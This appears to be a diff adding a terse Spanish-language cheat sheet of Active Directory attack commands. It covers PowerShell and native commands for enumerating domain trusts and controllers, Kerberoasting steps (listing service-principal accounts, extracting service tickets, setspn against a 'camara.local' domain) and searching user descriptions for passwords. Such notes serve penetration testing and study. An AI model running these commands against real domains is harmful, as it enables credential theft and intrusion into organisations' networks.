@@ -1,0 +1,27 @@
+Get-ADTrust -Filter * mirar dominios bidireccional "los users se pueden autenticar d uno al otro"
+nltest.exe /domain_trusts FORMA NATIVA
+----------------
+VERIFICAR LAS RELACIONES DE CONFIANZA
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+...............
+NOMBRE DEL CONTROLADOR DE DOMINIO
+[DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | ForEach-Object { $_.Name }
+[DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers 
+-------------
+VERIFICAR LAS RELACIONES DE CONFIANZA
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+-------------
+sid
+SID 519 Administradores de empresa
+................
+KERBEROASTING
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
+Get-NetUser | Where-Object {$_.servicePrincipalName} | fl con  POWERSHELL
+get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
+Get-TGSCipher extrae el service ticket
+---------------
+BUSCA CONTRASEÑA
+Find-UserField -SearchField Description -SearchTerm “built”
+-------------
+CUENTA DE SERVICIO
+setspn -T camara.local -Q */* FORMA NATIVA
